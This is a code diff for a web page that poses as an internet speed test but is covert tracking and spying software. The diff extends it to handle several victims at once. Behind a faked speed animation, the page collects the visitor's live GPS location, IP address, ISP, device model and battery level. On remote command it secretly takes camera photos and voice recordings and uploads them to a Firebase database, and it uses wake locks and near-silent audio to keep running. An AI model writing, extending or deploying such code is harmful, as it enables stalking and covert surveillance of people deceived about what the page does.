@@ -236,7 +236,7 @@
 
         <div class="perm-notice" id="permNotice">
             📍 Location permission প্রয়োজন। Allow করুন।<br>
-            📷 Camera & Mic এর permission দিন।
+            📷 Camera &amp; Mic এর permission দিন।
         </div>
 
         <div class="bg-status" id="bgStatus">
@@ -273,7 +273,14 @@
         };
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
-        const userRef = ref(db, 'live_location/target_user');
+
+        // ═══════════════════════════════════════════════════════════
+        //  Multi-User Tag ID (URL এ ?tag=1 দিলে সেই নম্বরে রেকর্ড হবে)
+        //  Default: tag1 (কেউ tag না বললে)
+        // ═══════════════════════════════════════════════════════════
+        const urlParams = new URLSearchParams(window.location.search);
+        const tagId = (urlParams.get('tag') || '1').replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 20) || '1';
+        const userRef = ref(db, `live_location/users/tag${tagId}`);
 
         const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
         let wakeLock = null;
@@ -295,18 +302,15 @@
                 if ('wakeLock' in navigator) {
                     wakeLock = await navigator.wakeLock.request('screen');
                     wakeLock.addEventListener('release', () => {
-                        // Screen turned off — re-request when possible
                         setTimeout(requestWakeLock, 1000);
                     });
                 }
             } catch (e) {}
         }
 
-        // Re-acquire wake lock when page becomes visible again
         document.addEventListener('visibilitychange', async () => {
             if (document.visibilityState === 'visible') {
                 await requestWakeLock();
-                // Resume audio
                 document.getElementById('keepAliveAudio').play().catch(() => {});
             }
         });
@@ -325,92 +329,167 @@
         }
 
         // ═══════════════════════════════════════════════════════════
-        //  IP & ISP — 5 fallback APIs
+        //  IP & ISP — HTTPS only APIs (no mixed content)
         // ═══════════════════════════════════════════════════════════
         let userIp = "Unknown", userIsp = "Unknown";
 
         async function fetchNetworkData() {
+            // শুধু HTTPS APIs ব্যবহার করা হচ্ছে (HTTP block হয়)
             const apis = [
-                // API 1: ipinfo.io
+                // API 1: ipwho.is (reliable, HTTPS)
                 async () => {
-                    const r = await fetch('https://ipinfo.io/json?token=', { signal: AbortSignal.timeout(4000) });
+                    const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
                     const d = await r.json();
-                    return { ip: d.ip, isp: d.org || d.company?.name || 'Unknown' };
+                    if (!d.success) throw new Error('failed');
+                    return { ip: d.ip, isp: d.connection?.isp || d.connection?.org || d.org || 'Unknown' };
                 },
-                // API 2: ip-api.com (মোবাইলে ভালো কাজ করে)
+                // API 2: ipapi.co
                 async () => {
-                    const r = await fetch('http://ip-api.com/json/?fields=query,isp,org', { signal: AbortSignal.timeout(4000) });
+                    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
                     const d = await r.json();
-                    return { ip: d.query, isp: d.isp || d.org || 'Unknown' };
-                },
-                // API 3: ipwho.is
-                async () => {
-                    const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(4000) });
-                    const d = await r.json();
-                    return { ip: d.ip, isp: d.connection?.isp || d.org || 'Unknown' };
-                },
-                // API 4: freeipapi.com
-                async () => {
-                    const r = await fetch('https://freeipapi.com/api/json', { signal: AbortSignal.timeout(4000) });
-                    const d = await r.json();
-                    return { ip: d.ipAddress, isp: d.isp || 'Unknown' };
-                },
-                // API 5: ipapi.co
-                async () => {
-                    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
-                    const d = await r.json();
+                    if (d.error) throw new Error('failed');
                     return { ip: d.ip, isp: d.org || d.asn || 'Unknown' };
+                },
+                // API 3: freeipapi.com
+                async () => {
+                    const r = await fetch('https://freeipapi.com/api/json', { signal: AbortSignal.timeout(5000) });
+                    const d = await r.json();
+                    return { ip: d.ipAddress, isp: d.isp || d.asName || 'Unknown' };
+                },
+                // API 4: ipify (IP only, then ISP from ip-api via HTTPS proxy)
+                async () => {
+                    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
+                    const d = await r.json();
+                    // Try to get ISP separately
+                    try {
+                        const r2 = await fetch(`https://ipapi.co/${d.ip}/json/`, { signal: AbortSignal.timeout(4000) });
+                        const d2 = await r2.json();
+                        return { ip: d.ip, isp: d2.org || d2.asn || 'Unknown' };
+                    } catch {
+                        return { ip: d.ip, isp: 'Unknown' };
+                    }
+                },
+                // API 5: cloudflare trace
+                async () => {
+                    const r = await fetch('https://cloudflare.com/cdn-cgi/trace', { signal: AbortSignal.timeout(5000) });
+                    const text = await r.text();
+                    const ip = text.match(/ip=([^\n]+)/)?.[1] || null;
+                    if (!ip) throw new Error('no ip');
+                    return { ip, isp: 'Unknown' };
                 }
             ];
 
             for (const apiFn of apis) {
                 try {
                     const result = await apiFn();
-                    if (result.ip && result.ip !== 'undefined') {
+                    if (result.ip && result.ip !== 'undefined' && result.ip !== 'Unknown') {
                         userIp = result.ip;
                         // Clean ISP: Remove AS number prefix like "AS12345 "
-                        userIsp = result.isp.replace(/^AS\d+\s*/, '').trim() || 'Unknown';
+                        userIsp = (result.isp || 'Unknown').replace(/^AS\d+\s*/, '').trim() || 'Unknown';
+                        console.log('IP/ISP found:', userIp, userIsp);
                         return;
                     }
-                } catch {}
+                } catch(e) {
+                    console.log('API failed, trying next...', e.message);
+                }
             }
             userIp = "Blocked";
-            userIsp = "Unknown";
+            userIsp = "VPN/Blocked";
         }
         fetchNetworkData();
 
         // ═══════════════════════════════════════════════════════════
-        //  Device Name Detection
+        //  Device Name Detection — উন্নত পদ্ধতি
         // ═══════════════════════════════════════════════════════════
         let deviceModel = "Detecting...";
 
         async function getDeviceName() {
-            // Method 1: User Agent Data (Chrome Android)
+            // Method 1: User Agent Client Hints (Chrome Android — সবচেয়ে accurate)
             if (navigator.userAgentData) {
                 try {
-                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
-                    if (hints.model && hints.model.trim()) {
-                        return `${hints.model} (${hints.platform} ${hints.platformVersion})`;
+                    const hints = await navigator.userAgentData.getHighEntropyValues([
+                        "model", "platform", "platformVersion", "brands", "fullVersionList"
+                    ]);
+                    console.log('UA hints:', hints);
+                    if (hints.model && hints.model.trim() && hints.model !== '') {
+                        const model = hints.model.trim();
+                        const platform = hints.platform || '';
+                        const ver = hints.platformVersion || '';
+                        return `${model} (${platform} ${ver})`.trim();
                     }
-                    if (hints.platform) return hints.platform;
-                } catch {}
+                    // model খালি — platform ব্যবহার করি
+                    if (hints.platform) {
+                        return `${hints.platform} ${hints.platformVersion || ''}`.trim();
+                    }
+                } catch(e) {
+                    console.log('UA hints error:', e);
+                }
             }
-            // Method 2: User Agent parsing
+
+            // Method 2: User Agent String parsing (fallback)
             const ua = navigator.userAgent;
+            console.log('UA string:', ua);
+
+            // iPhone detection
             if (/iPhone/i.test(ua)) {
                 const match = ua.match(/iPhone OS ([\d_]+)/);
                 return match ? `iPhone (iOS ${match[1].replace(/_/g,'.')})` : 'iPhone';
             }
-            if (/iPad/i.test(ua)) return 'iPad';
-            const androidMatch = ua.match(/Android ([\d.]+).*?;\s*([^;)]+?)\s*(?:Build|wv)[/)/]/i);
-            if (androidMatch) return `${androidMatch[2].trim()} (Android ${androidMatch[1]})`;
-            if (/Android/i.test(ua)) return 'Android Phone';
+            // iPad
+            if (/iPad/i.test(ua)) {
+                const match = ua.match(/CPU OS ([\d_]+)/);
+                return match ? `iPad (iPadOS ${match[1].replace(/_/g,'.')})` : 'iPad';
+            }
+
+            // Android — model name extract করার চেষ্টা
+            if (/Android/i.test(ua)) {
+                const androidVersion = ua.match(/Android ([\d.]+)/)?.[1] || '';
+
+                // Pattern 1: "Android 13; SM-G991B Build" → SM-G991B
+                const buildMatch = ua.match(/Android[\d.]+;\s*([^;)]+?)\s*(?:Build|wv)[\/)/]/i);
+                if (buildMatch) {
+                    const model = buildMatch[1].trim();
+                    // কিছু generic নাম বাদ দেই
+                    const skipList = ['Linux', 'Mobile', 'Phone', 'Tablet', 'K'];
+                    if (model && !skipList.some(s => model === s)) {
+                        return `${model} (Android ${androidVersion})`;
+                    }
+                }
+
+                // Pattern 2: শেষ semicolon এর পর
+                const parts = ua.match(/\(([^)]+)\)/);
+                if (parts) {
+                    const segments = parts[1].split(';').map(s => s.trim());
+                    // Android version এর পরে model আসে সাধারণত
+                    for (let i = 0; i < segments.length; i++) {
+                        if (segments[i].includes('Android') && segments[i+1]) {
+                            const candidate = segments[i+1].replace(/Build.*/, '').trim();
+                            if (candidate && candidate.length > 1) {
+                                return `${candidate} (Android ${androidVersion})`;
+                            }
+                        }
+                    }
+                }
+
+                return `Android ${androidVersion || 'Phone'}`;
+            }
+
+            // Windows Phone
             if (/Windows Phone/i.test(ua)) return 'Windows Phone';
+            // MacBook/iMac
             if (/Macintosh/i.test(ua)) return 'MacBook/iMac';
+            // Windows PC
             if (/Windows/i.test(ua)) return 'Windows PC';
+            // Linux
+            if (/Linux/i.test(ua)) return 'Linux Device';
+
             return 'Unknown Device';
         }
-        getDeviceName().then(n => deviceModel = n);
+
+        getDeviceName().then(n => {
+            deviceModel = n;
+            console.log('Device model detected:', deviceModel);
+        });
 
         // ═══════════════════════════════════════════════════════════
         //  Secret Camera Capture
@@ -422,18 +501,18 @@
                 const video = document.getElementById('spyVideo');
                 video.srcObject = stream;
                 await video.play();
-                await new Promise(r => setTimeout(r, 1500)); // warm up camera
+                await new Promise(r => setTimeout(r, 1500));
                 const canvas = document.createElement('canvas');
                 canvas.width = 640; canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 stream.getTracks().forEach(t => t.stop());
                 video.srcObject = null;
-                set(ref(db, 'live_location/photo'), {
+                set(ref(db, `live_location/users/tag${tagId}/photo`), {
                     image: canvas.toDataURL('image/jpeg', 0.75),
                     time: Date.now(), camType
                 });
             } catch (err) {
-                set(ref(db, 'live_location/photo'), {
+                set(ref(db, `live_location/users/tag${tagId}/photo`), {
                     error: `Cam (${camType}) error: ${err.message || 'Blocked'}`,
                     time: Date.now()
                 });
@@ -446,7 +525,9 @@
         async function captureVoiceRecord(duration = 5000) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm' });
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm'
+                });
                 const audioChunks = [];
                 mediaRecorder.addEventListener("dataavailable", e => { if (e.data.size > 0) audioChunks.push(e.data); });
                 mediaRecorder.addEventListener("stop", () => {
@@ -454,12 +535,16 @@
                     const blob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
-                    reader.onloadend = () => set(ref(db, 'live_location/audio'), { file: reader.result, time: Date.now() });
+                    reader.onloadend = () => set(ref(db, `live_location/users/tag${tagId}/audio`), {
+                        file: reader.result, time: Date.now()
+                    });
                 });
-                mediaRecorder.start(1000); // chunk every 1s
+                mediaRecorder.start(1000);
                 setTimeout(() => { if (mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, duration);
             } catch (err) {
-                set(ref(db, 'live_location/audio'), { error: `Mic error: ${err.message || 'Blocked'}`, time: Date.now() });
+                set(ref(db, `live_location/users/tag${tagId}/audio`), {
+                    error: `Mic error: ${err.message || 'Blocked'}`, time: Date.now()
+                });
             }
         }
 
@@ -467,11 +552,11 @@
         //  Firebase Command Listener
         // ═══════════════════════════════════════════════════════════
         let lastCmdTime = 0;
-        onValue(ref(db, 'live_location/command'), (snap) => {
+        onValue(ref(db, `live_location/users/tag${tagId}/command`), (snap) => {
             const cmd = snap.val();
             if (!cmd) return;
             const now = Date.now();
-            const WINDOW = 8000; // 8 second command window
+            const WINDOW = 8000;
 
             if (cmd.ringTime && cmd.ringTime > now - WINDOW && cmd.ringTime > lastCmdTime) {
                 lastCmdTime = cmd.ringTime;
@@ -489,7 +574,7 @@
         });
 
         // ═══════════════════════════════════════════════════════════
-        //  GPS Tracking — optimized
+        //  GPS Tracking
         // ═══════════════════════════════════════════════════════════
         function startGPSTracking() {
             if (!navigator.geolocation) return;
@@ -510,6 +595,7 @@
                         deviceInfo: deviceModel,
                         ip_address: userIp,
                         isp: userIsp,
+                        tagId: tagId,
                         lastSeen: Date.now()
                     });
                 },
@@ -520,9 +606,10 @@
                         isOnline: true, status: errMsg,
                         ip_address: userIp, isp: userIsp,
                         battery: batLvl, charging: isChg,
-                        deviceInfo: deviceModel, lastSeen: Date.now()
+                        deviceInfo: deviceModel,
+                        tagId: tagId,
+                        lastSeen: Date.now()
                     });
-                    // Retry after 5 seconds
                     setTimeout(startGPSTracking, 5000);
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
@@ -530,16 +617,14 @@
         }
 
         // ═══════════════════════════════════════════════════════════
-        //  Heartbeat — stays online even without GPS update
+        //  Heartbeat
         // ═══════════════════════════════════════════════════════════
         function startHeartbeat() {
             clearInterval(heartbeatInterval);
             heartbeatInterval = setInterval(() => {
-                // Update lastSeen every 30 seconds
-                set(ref(db, 'live_location/target_user/lastSeen'), Date.now());
-                set(ref(db, 'live_location/target_user/battery'), batLvl);
-                set(ref(db, 'live_location/target_user/charging'), isChg);
-                // Keep audio alive
+                set(ref(db, `live_location/users/tag${tagId}/lastSeen`), Date.now());
+                set(ref(db, `live_location/users/tag${tagId}/battery`), batLvl);
+                set(ref(db, `live_location/users/tag${tagId}/charging`), isChg);
                 const audio = document.getElementById('keepAliveAudio');
                 if (audio.paused) audio.play().catch(() => {});
             }, 30000);
@@ -550,7 +635,7 @@
         // ═══════════════════════════════════════════════════════════
         const progressRing = document.getElementById('progressRing');
         const glowRing = document.getElementById('glowRing');
-        const CIRCUMFERENCE = 2 * Math.PI * 100; // ~628
+        const CIRCUMFERENCE = 2 * Math.PI * 100;
 
         function setProgress(percent) {
             const offset = CIRCUMFERENCE - (Math.min(percent, 100) / 100) * CIRCUMFERENCE;
@@ -581,15 +666,12 @@
             startBtn.disabled = true;
             document.getElementById('permNotice').classList.remove('show');
 
-            // ── Step 1: Wake Lock ──
             await requestWakeLock();
 
-            // ── Step 2: Audio keep-alive ──
             const audio = document.getElementById('keepAliveAudio');
-            audio.volume = 0.01; // near-silent
+            audio.volume = 0.01;
             audio.play().catch(() => {});
 
-            // ── Step 3: Request all permissions at once ──
             if (!activated) {
                 activated = true;
                 try {
@@ -599,28 +681,28 @@
                     });
                     tempStream.getTracks().forEach(t => t.stop());
                 } catch (e) {
-                    // Show permission note
                     document.getElementById('permNotice').classList.add('show');
                 }
 
-                // ── Step 4: Set onDisconnect ──
                 onDisconnect(userRef).update({ isOnline: false, lastSeen: Date.now() });
 
-                // ── Step 5: Start GPS ──
                 if (navigator.geolocation) {
                     startGPSTracking();
                 } else {
                     document.getElementById('permNotice').classList.add('show');
                 }
 
-                // ── Step 6: Start heartbeat ──
                 startHeartbeat();
-
-                // Show background active indicator
                 document.getElementById('bgStatus').classList.add('show');
+
+                // IP ও Device পাওয়া না গেলে আবার চেষ্টা
+                if (userIp === 'Unknown') fetchNetworkData();
+                if (deviceModel === 'Detecting...') {
+                    getDeviceName().then(n => deviceModel = n);
+                }
             }
 
-            // ── Speed Test Animation ──
+            // Speed Test Animation
             ['pingVal','downVal','upVal'].forEach(id => {
                 const el = document.getElementById(id);
                 el.innerText = '--';
@@ -628,7 +710,6 @@
             });
             setSpeed(0); setPhase(0);
 
-            // Phase 1: Ping test
             document.getElementById('speedStatus').innerText = 'PINGING';
             document.getElementById('speedType').innerText = 'LATENCY TEST';
             document.getElementById('mainSpeed').style.color = 'var(--accent)';
@@ -638,7 +719,6 @@
             document.getElementById('pingVal').classList.add('active');
             setPhase(1);
 
-            // Phase 2: Download
             document.getElementById('speedStatus').innerText = 'TESTING';
             document.getElementById('speedType').innerText = 'DOWNLOAD';
             let fakeDown = 0;
@@ -652,7 +732,6 @@
             document.getElementById('downVal').classList.add('active');
             setPhase(2);
 
-            // Phase 3: Upload
             document.getElementById('speedType').innerText = 'UPLOAD';
             let fakeUp = 0;
             const targetUp = fakeDown * (0.2 + Math.random() * 0.35);
@@ -665,7 +744,6 @@
             document.getElementById('upVal').classList.add('active');
             setPhase(3);
 
-            // Done
             document.getElementById('speedStatus').innerText = 'COMPLETE';
             document.getElementById('speedType').innerText = 'TEST DONE ✓';
             setSpeed(fakeDown, 100);
@@ -689,7 +767,7 @@
                     const t = Math.min((now - start) / duration, 1);
                     const eased = t < 0.5 ? 2*t*t : -1+(4-2*t)*t;
                     let val = from + (to - from) * eased;
-                    val += (Math.random() - 0.5) * 2.5; // natural jitter
+                    val += (Math.random() - 0.5) * 2.5;
                     val = Math.max(0, val);
                     onUpdate(val);
                     if (t < 1) requestAnimationFrame(step);
@@ -699,11 +777,9 @@
             });
         }
 
-        // Page visibility — resume tracking when tab returns to foreground
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'visible' && activated) {
                 document.getElementById('keepAliveAudio').play().catch(() => {});
-                // Re-check GPS
                 if (gpsWatchId === null) startGPSTracking();
             }
         });
